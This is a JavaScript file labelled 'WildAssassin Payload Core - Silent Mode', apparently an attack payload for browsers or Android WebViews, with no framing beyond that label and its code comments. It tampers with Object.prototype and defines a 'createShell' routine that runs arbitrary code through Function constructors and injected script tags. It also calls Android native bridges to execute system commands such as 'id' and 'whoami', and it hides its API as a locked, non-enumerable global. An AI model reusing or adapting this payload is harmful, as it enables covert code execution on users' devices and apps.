/* WildAssassin Payload Core - Silent Mode */
(function(_c) {
    'use strict';
    var F = Function, R = RegExp, D = document;
    
    // 1. Env Sanitize: Try to restore prototype access if hijacked
    try {
        Object.defineProperty(Object.prototype, '__lookupGetter__', {
            value: function(s) { return this[s]; },
            writable: true, configurable: true
        });
    } catch (e) {}

    // 2. Breakout Core: Create pure context to execute code
    var createShell = function(cmd) {
        try {
            return new F('return (' + cmd + ')')();
        } catch (e1) {
            try {
                return F('with(this){' + cmd + '}').call(this);
            } catch (e2) {
                if (D) {
                    var s = D.createElement('script');
                    s.text = 'window._$wa_result=(' + cmd + ');';
                    D.head.appendChild(s).remove();
                    return window._$wa_result;
                }
                throw e2;
            }
        }
    };

    // 3. Native Bridge Trigger (Android)
    var triggerNative = function() {
        if (typeof Java !== 'undefined' && Java.use) {
            return Java.use('java.lang.Runtime').getRuntime().exec('id');
        }
        if (window.AndroidInterface) {
            return window.AndroidInterface.executeCommand('whoami');
        }
        return null;
    };

    // 4. Silent Mount API
    try {
        Object.defineProperty(window || globalThis, '_$wa', {
            value: { 
                exec: createShell, 
                native: triggerNative, 
                version: '2.0' 
            },
            writable: false,
            enumerable: false,
            configurable: false
        });
    } catch (e) {}
})();
